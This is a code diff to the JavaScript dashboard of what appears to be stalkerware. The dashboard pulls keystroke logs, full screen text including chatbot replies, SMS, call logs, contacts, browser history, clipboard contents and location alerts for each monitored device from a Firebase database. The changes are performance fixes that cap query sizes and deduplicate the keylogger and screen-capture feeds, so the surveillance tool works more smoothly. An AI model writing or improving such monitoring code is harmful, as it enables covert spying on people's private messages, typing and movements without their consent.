@@ -1,6 +1,6 @@
 import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js';
 import { getAuth, signOut, onAuthStateChanged } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js';
-import { getDatabase, ref, onValue, set, update, off, get, push, remove } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js';
+import { getDatabase, ref, onValue, set, update, off, get, push, remove, query, limitToLast } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js';
 import { getStorage as getStorageInstance } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-storage.js';
 
 const firebaseConfig = {
@@ -324,9 +324,16 @@ function initializeDataFeedListeners(uid) {
         f.innerHTML = rows.map(([k,v])=>`<div class="feed-item"><strong>${k}:</strong> ${v||'--'}</div>`).join('');
     });
 
-    // ── KEYLOGGER — User input + App switches + Screen content ──
+    // ── KEYLOGGER — FIX 2 APPLIED: Optimized sorting for limited dataset ──
     listenToFeed(uid, 'keylog', (d) => {
-        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
+        var raw = d || {};
+        var keys = Object.keys(raw);
+        if(keys.length > 60) {
+            keys.sort(function(a,b){ return (raw[b].timestamp||0)-(raw[a].timestamp||0); });
+            keys = keys.slice(0, 60);
+        }
+        var items = keys.map(function(k){ return raw[k]; }).sort(function(a,b){ return (b.timestamp||0)-(a.timestamp||0); });
+
         const c = document.getElementById('keylog-count'); if(c) c.textContent = items.length;
         const f = document.getElementById('keylog-feed'); if(!f) return;
         if(!items.length){f.innerHTML='No keystrokes yet (enable Accessibility Service)';return;}
@@ -420,11 +427,16 @@ function initializeDataFeedListeners(uid) {
         f.innerHTML = html;
     });
 
-    // ── SCREEN CONTENT — Full visible text (app responses, ChatGPT replies, etc.) ──
+    // ── SCREEN CONTENT — FIX 3 APPLIED: Deduplication & Size Cap ──
+    var lastScreenTs = 0;
     listenToFeed(uid, 'screen_content', (d) => {
         if(!d || !d.text) return;
+        if(d.timestamp && d.timestamp === lastScreenTs) return;
+        lastScreenTs = d.timestamp || 0;
         var f = document.getElementById('keylog-feed');
         if(!f) return;
+        var existing = f.innerHTML;
+        if(!existing || existing.indexOf('Waiting for data') >= 0 || existing.length > 50000) return;
         var appName = getFriendlyApp(d.app);
         var triggerLabel = d.trigger === 'app_switch' ? 'App opened' : d.trigger === 'after_input' ? 'After typing' : 'Screen changed';
         var html = '<div class="feed-item" style="border-left:3px solid #a78bfa;padding-left:8px;background:rgba(167,139,250,0.1);margin-bottom:4px;">';
@@ -434,7 +446,7 @@ function initializeDataFeedListeners(uid) {
         html += '</div>';
         html += '<div style="color:#e0d4ff;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:400px;overflow-y:auto;line-height:1.6;background:rgba(0,0,0,0.3);padding:10px;border-radius:4px;">' + esc(d.text) + '</div>';
         html += '</div>';
-        f.innerHTML = html + f.innerHTML;
+        f.innerHTML = html + existing;
     });
 
     listenToFeed(uid, 'geofence_alerts', (d) => {
@@ -699,10 +711,21 @@ function initializeDataFeedListeners(uid) {
     });
 }
 
+// ── FIX 1 APPLIED: Limited Queries for Performance ──
 function listenToFeed(uid, path, cb) {
-    const r = ref(database, `devices/${uid}/${path}`); const k = `feed-${path}-${uid}`;
+    const r = ref(database, `devices/${uid}/${path}`);
+    const k = `feed-${path}-${uid}`;
     if(deviceListeners[k]) off(deviceListeners[k]);
-    deviceListeners[k] = onValue(r, (s) => { if(s.exists()) try{cb(s.val());}catch(e){console.error(`Feed [${path}]:`,e);} });
+    var q = r;
+    if(path === 'keylog') q = query(r, limitToLast(60));
+    else if(path === 'sms' || path === 'call_log' || path === 'browser_history') q = query(r, limitToLast(30));
+    else if(path === 'contacts') q = query(r, limitToLast(100));
+    else if(path === 'installed_apps') q = query(r, limitToLast(50));
+    else if(path === 'clipboard' || path === 'geofence_alerts') q = query(r, limitToLast(15));
+    
+    deviceListeners[k] = onValue(q, (s) => {
+        if(s.exists()) try{ cb(s.val()); }catch(e){ console.error('Feed ['+path+']:', e); }
+    });
 }
 
 // ── FRIENDLY APP NAMES (35+ apps) ──
